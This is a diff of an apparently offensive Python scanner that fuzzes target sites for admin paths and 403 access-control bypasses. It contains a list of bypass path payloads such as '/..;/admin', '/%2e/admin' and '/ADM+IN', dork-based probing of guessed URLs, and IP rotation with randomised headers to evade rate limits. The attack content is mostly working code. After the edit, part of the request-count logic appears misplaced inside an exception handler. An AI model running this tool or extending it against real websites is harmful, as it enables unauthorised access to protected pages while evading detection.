@@ -24,7 +24,7 @@ fuzz = [("/","/?"),("//","//"),("///","///"),("/./","/./"),("/","?"),("/","??"),
         ("/","/%26/"),("/","/#"),("/","/#/"),("/","/#/./"),("/./",""),("/./","/"),("/..;/",""),("/..;/","/"),("/.;/",""),("/.;/","/"),("/;/",""),
         "/;/admin/","//;//admin","//;//admin/","/admin/./","/%2e/admin","/%2e/admin/","/%20/admin/%20","/%20/admin/%20/","/admin/..;/","/admin.json",
         "/admin/.json","/admin..;/","/admin;/","/admin%00","/admin.css","/admin.html","/admin?id=1","/admin~","/admin/~","/admin/°/","/admin/&",
-        "/admin/-","/admin\\/\\/","/admin/..%3B/","/admin/;%2f..%2f..%2f","/ADMIN","/ADMIN/","/admin/..\\;/","/*/admin","/*/admin/","/ADM+IN","/ADM+IN/"] # convert to tuples
+        "/admin/-","/admin\\/\\/","/admin/..%3B/","/admin/;%2f..%2f..%2f","/admin/..\\;/","/*/admin","/*/admin/","/ADMIN","/ADMIN/","/ADM+IN","/ADM+IN/"] # convert to tuples
 
 bypass_payloads = {
     "admin": [
@@ -179,48 +179,36 @@ def Vulnsearch():
         for i in range(len(dorks)):
             if stop_event.is_set():
                 return
-            if dorks[i] not in tried and dorks[i][1] == " " and dorks[i][2] == " ":
-                with lock:
-                    tried.append(dorks[i])
-                    
-                URL = "https://" + dorks[i][0] + target 
-            elif dorks[i] not in tried and dorks[i][1] != " " and dorks[i][2] == " " :
-                with lock:
-                    tried.append(dorks[i])
 
-                URL = "https://" + dorks[i][0] + target + dorks[i][1]
-            elif dorks[i] not in tried and dorks[i][1] != " " and dorks[i][2] != " " :
-                with lock:
-                    tried.append(dorks[i])
-                URL = "https://" + dorks[i][0] + target + dorks[i][1] + dorks[i][2]
+            URL = "https://" + dorks[i][0] + target + dorks[i][1] + dorks[i][2]
 
-                try:            
-                    s = requests.get(URL, headers=headers[rh])
-                    reqcount += 1
-                    if s.status_code in [202,200,302]:
-                        with lock:
-                                vulnerable.append("https://" + dorks[i][0] + target + dorks[i][1])
-                        flagcatch(s,flagscaught)
-                    elif s.status_code == 403:
-                        try:
-                            for payload_list in bypass_payloads.values():
-                                for payload in payload_list:
-                                    req = "https://" + target + payload
-                                    r = requests.get(req, headers=headers[rh])
-                                    reqcount += 1 
+            try:            
+                s = requests.get(URL, headers=headers[rh])
+                reqcount += 1
+                if s.status_code in [202,200,302]:
+                    with lock:
+                            vulnerable.append("https://" + dorks[i][0] + target + dorks[i][1])
+                    flagcatch(s,flagscaught)
+                elif s.status_code == 403:
+                    try:
+                        for payload_list in bypass_payloads.values():
+                            for payload in payload_list:
+                                req = "https://" + target + payload
+                                r = requests.get(req, headers=headers[rh])
+                                reqcount += 1 
 
-                                    if r.status_code in [202,200,302]:
-                                        with lock:
-                                            vulnerable.append(req)
-                                        flagcatch(r,flagscaught)
-                        except requests.exceptions.RequestException as e:
-                            print(f"403 fuzz Request Connection error: {e}")
-                            stop_event.set()
-                            mainmenu()
-                except (KeyboardInterrupt, requests.exceptions.RequestException) as e:
-                    print(f"Request failed or interrupted for {URL}: {e}")
-                    stop_event.set()
-                    mainmenu()
+                                if r.status_code in [202,200,302]:
+                                    with lock:
+                                        vulnerable.append(req)
+                                    flagcatch(r,flagscaught)
+                    except requests.exceptions.RequestException as e:
+                        print(f"403 fuzz Request Connection error: {e}")
+                        stop_event.set()
+                        mainmenu()
+            except (KeyboardInterrupt, requests.exceptions.RequestException) as e:
+                print(f"Request failed or interrupted for {URL}: {e}")
+                stop_event.set()
+                mainmenu()
                 if reqcount >= rm:
                     reqcount = 0
                     change_ip()
@@ -287,6 +275,12 @@ def bypass():
             if fuzz[i] not in fuzztried:
                 with lock:
                     fuzztried.append(fuzz[i])
+                if i == len(fuzz) - 4 or i == len(fuzz) - 3:
+                    fuzzatt = "https://" + fuzz[i][0] + core.upper() + fuzz[i][1]
+                elif i == len(fuzz) - 2 or i == len(fuzz) - 1:
+                    coreup = core.upper()
+                    fuzzatt = "https://" + fuzz[i][0] + coreup[0:(len(coreup) - 1) // 2] + "+" + coreup[(len(coreup) - 1) // 2: len(coreup)] + fuzz[i][1]
+                else:
                     fuzzatt = "https://" + fuzz[i][0] + core + fuzz[i][1]
                 try:
                     ff = requests.get(fuzzatt, headers=headers[rh])
@@ -304,6 +298,8 @@ def bypass():
                     change_ip()
                     rh = random.randint(0, len(headers)-1)
                     rm = random.randint(range1, range2)
+
+             
     for i in range(threadcount):
         thread = threading.Thread(target=task2, args=(target,flagscaught))
         thread.start()
